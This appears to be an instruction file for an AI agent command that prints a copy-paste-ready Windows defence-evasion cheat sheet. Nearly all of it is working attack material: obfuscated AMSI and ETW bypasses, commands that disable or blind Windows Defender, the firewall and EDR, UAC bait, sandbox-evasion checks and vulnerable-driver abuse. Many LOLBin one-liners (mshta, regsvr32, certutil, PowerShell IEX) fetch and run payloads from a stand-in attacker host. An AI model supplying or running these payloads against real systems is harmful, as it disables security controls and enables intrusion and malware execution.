# Trigger
User says `/osai-bypass` followed by an optional category.

Categories: amsi, etw, clm, defender, applocker, av, firewall, uac, wdac, execpol, lolbin

$ARGUMENTS = optional category filter. If empty, list all categories with one-line description and ask which one.

# Purpose
Windows security control bypass cheat sheet for engagement. Every payload is copy-paste ready.

# Steps

## If no category specified, print this menu:
```
OSAI BYPASS CHEAT SHEET
  amsi      — AMSI bypass (reflection, obfuscated, base64, v2 downgrade, patching)
  etw       — ETW patching (disable event tracing, enumerate providers)
  clm       — Constrained Language Mode bypass (v2, System32 trick, PowerShdll)
  defender  — Windows Defender (disable, exclusions, remove sigs, symlink hijack)
  applocker — AppLocker bypass (writable paths, policy enum)
  av        — AV/EDR evasion (static, dynamic, syscalls, MOTW, DLL sideload, BYOVD, token stomp)
  firewall  — Disable/enumerate Windows Firewall
  uac       — UAC bypass (check status, auto-elevate)
  wdac      — WDAC/CI policy to disable EDR (Krueger, CiTool)
  execpol   — Execution policy bypass
  lolbin    — LOLBin execution (mshta, regsvr32, rundll32, msbuild, installutil, certutil, odbcconf)

Usage: /osai-bypass amsi
```

---

## Category: amsi

### Reflection — amsiInitFailed (Matt Graeber)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### Format-string variant (evades string signatures)
```powershell
$b='ms';[Ref].Assembly.GetType(('System.Manage{0}ent.Auto{0}ation.A{1}i{2}tils'-f'm','ms','U')).GetField(('a{0}iInitFailed'-f$b),'NonPublic,Static').SetValue($null,$true)
```

### Heavy obfuscation variant
```powershell
Try{
  $Xdatabase = 'Utils';$Homedrive = 'si'
  $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
  $DiskMgr = 'Syst+@.M£n£g' + 'e@+nt.Auto@' + '£tion.A' -join ''
  $fdx = '@ms' + '£In£' + 'tF@£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
  $CleanUp = $DiskMgr.Replace('@','m').Replace('£','a').Replace('+','e')
  $Rawdata = $fdx.Replace('@','a').Replace('£','i').Replace('+','e')
  $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
  $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
  $Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```

### Base64 Unicode variant
```powershell
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
```

### PowerShell v2 downgrade (no AMSI)
```powershell
powershell.exe -version 2
powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://KALI/rev.ps1')"
```

### Memory patching (AmsiScanBuffer)
Overwrite AmsiScanBuffer in amsi.dll to return E_INVALIDARG. Tools: AmsiTrigger to find trigger, then patch.

### LdrLoadDll hook
Hook ntdll!LdrLoadDll to return STATUS_DLL_NOT_FOUND (0xC0000135) when amsi.dll requested. Prevents AMSI loading entirely.

### Fresh bypass generators
- https://amsi.fail/
- https://amsibypass.com/

### Tools
- AmsiTrigger — find exact trigger bytes
- PSAmsi — https://github.com/cobbr/PSAmsi
- Amsi-Bypass-Powershell — https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

---

## Category: etw

### Disable ETW for current PowerShell session
```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

### Enumerate ETW providers
```powershell
logman query providers
logman query providers Microsoft-Antimalware-Scan-Interface
logman query providers -pid <PID>
```

### Key ETW providers
| Provider | GUID |
|----------|------|
| AMSI | {2A576B87-09A7-520E-C21A-4942F0271D67} |
| PowerShell | {A0C1853B-5C40-4B15-8766-3CF1C58F985A} |
| Threat-Intelligence | {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} |

---

## Category: clm

### Check current mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```

### PowerShell v2 downgrade
```powershell
powershell.exe -version 2 -ExecutionPolicy bypass
powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://KALI/rev.ps1')"
```

### System32 path trick (bypasses __PSLockDownPolicy)
```powershell
mkdir C:\Users\Public\System32
copy script.ps1 C:\Users\Public\System32\script.ps1
C:\Users\Public\System32\script.ps1
```
Scripts in any path containing "System32" run in FullLanguage mode.

### PowerShdll / PowerShx (no powershell.exe)
```powershell
rundll32 PowerShdll,main -i
rundll32 PowerShdll,main -f <path>
rundll32 PowerShx.dll,main -e "<PS_SCRIPT>"
rundll32 PowerShx.dll,main -s      # attempt AMSI bypass
rundll32 PowerShx.dll,main -i      # interactive console
```

---

## Category: defender

### Disable real-time monitoring (requires admin)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning 1
```

### Add exclusion paths (stealthier than disabling)
```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionPath "C:\Users\Public"
Set-MpPreference -ExclusionProcess "word.exe","vmwp.exe"
Set-MpPreference -ExclusionExtension ".exe",".dll"
```

### Blanket exclusions for every drive
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

### WMI exclusion (alternative)
```powershell
WMIC /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath="C:\Users\Public"
```

### Remove signatures
```powershell
& "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18*\MpCmdRun.exe" -RemoveDefinitions -All
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Kill Defender GUI
```powershell
taskkill /F /IM SecHealthUI.exe
```

### Check status
```powershell
Get-MpComputerStatus
```

### Defender Platform symlink hijack (admin required)
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
shutdown /r /t 0
```
After reboot verify: `Get-Process MsMpEng | Select-Object Id,Path`
Remove symlink to kill Defender on next start: `rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"`

---

## Category: firewall

### Enumerate
```powershell
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq "0"} | select name,applicationname,localports
```

### Disable
```powershell
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

---

## Category: uac

### Check UAC status
```powershell
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
```

### Find auto-elevate binaries
```powershell
strings.exe -s *.exe | findstr /I "<autoElevate>true</autoElevate>"
```

### Self-elevate via UAC bait
```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

---

## Category: wdac

### Deploy WDAC policy to disable EDR
```powershell
smbmap -u Administrator -p P@ssw0rd -H 192.168.4.4 --upload "/home/kali/SiPolicy.p7b" "ADMIN$/System32/CodeIntegrity/SiPolicy.p7b"
smbmap -u Administrator -p P@ssw0rd -H 192.168.4.4 -x "shutdown /r /t 0"
```

### Krueger (Cobalt Strike)
```powershell
inlineExecute-Assembly --dotnetassembly C:\Tools\Krueger.exe --assemblyargs --host ms01
```

### Remove WDAC policy (Win11 2022+)
```powershell
CiTool.exe -rp "{PolicyId GUID}" -json
```

### Check WDAC mode
```powershell
Get-ComputerInfo
# DeviceGuardCodeIntegrityPolicyEnforcementStatus
# DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus
```

---

## Category: execpol

### Execution policy bypass
```powershell
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope Process -Force
Unblock-File my-file-from-internet
Get-Content .\run.ps1 | Invoke-Expression
Get-ExecutionPolicy    # check current
```

---

## Category: av

### Static detection bypass
- Obfuscate strings, dynamically resolve imports, reduce IAT
- Custom GetProcAddress and GetModuleHandle
- API Hashing for import resolution
- Avoid RWX memory (use RW then RX)
- Break parent-child process links
- DLLs have lower detection than EXEs
- Encrypt shellcode (XOR, AES, RC4)

### Signature identification (find what triggers AV)
Tools: DefenderCheck, ThreatCheck, gocheck — binary search to find flagged bytes.

### Freeze toolkit (EDR bypass via suspended processes + direct syscalls)
```bash
git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go
./Freeze -I demon.bin -encrypt -O demon.exe
```

### PackMyPayload (MoTW bypass via ISO container)
```bash
python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
```

### Dynamic / sandbox evasion
```powershell
# RAM check (sandbox < 2GB)
if ((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum / 1gb -lt 2) { exit }

# Computer name (Defender sandbox = HAL9TH)
if ($env:COMPUTERNAME -eq "HAL9TH") { exit }

# Domain-joined check
if (-not (Get-WmiObject Win32_ComputerSystem).PartOfDomain) { exit }

# Sleep-based timing check
$t1 = Get-Date; Start-Sleep -Seconds 10; if (((Get-Date)-$t1).Seconds -lt 9) { exit }
```

### Direct/indirect syscalls (SysWhispers4)
```bash
python syswhispers.py --preset injection --method indirect --resolve recycled
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

### DLL sideloading
Find vulnerable apps with Siofra, create proxy DLLs with SharpDLLProxy:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name | ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin
```

### BYOVD (Bring Your Own Vulnerable Driver)
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start ServiceMouse
```
IOCTLs: `0x99000050` = kill process, `0x990000D0` = delete file, `0x990001D0` = unload driver.

### Token stomping (kill AV/EDR privileges)
Tools: KillDefender, TokenStomp, TokenStripBOF

### PPL abuse — check LSASS PPL
```powershell
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

### 8.3 short path discovery (for path evasion)
```cmd
dir /x
for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA
```

---

## Category: lolbin

### Mshta
```powershell
mshta vbscript:Close(Execute("GetObject(""script:http://KALI/payload.sct"")"))
mshta http://KALI/payload.hta
mshta \\webdavserver\folder\payload.hta
```

### Regsvr32 (Squiblydoo)
```powershell
regsvr32 /u /n /s /i:http://KALI/payload.sct scrobj.dll
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

### Rundll32
```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://KALI/payload.sct");window.close();
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

### MSBuild
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

### InstallUtil
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u payload.dll
```

### Regasm
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u payload.dll
```

### Certutil
```powershell
certutil -urlcache -split -f http://KALI/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
certutil -urlcache -split -f http://KALI/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

### Odbcconf
```powershell
odbcconf /s /a {regsvr \\webdavserver\folder\payload.dll}
```

### Cscript/Wscript
```powershell
cscript //E:jscript \\webdavserver\folder\payload.txt
```

### Microsoft.Workflow.Compiler.exe
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

### SharpShooter payloads
```bash
# Stageless JS
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
# Stageless HTA with HTML smuggling
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
# Staged VBS
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

### GreatSCT (MSBuild payload)
```bash
./GreatSCT.py
# use 1 -> list -> use 9 (rev_tcp.py) -> set lhost/lport -> generate
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

# Token discipline
Print ONLY the requested category. Never dump the entire cheat sheet unless user asks for all.
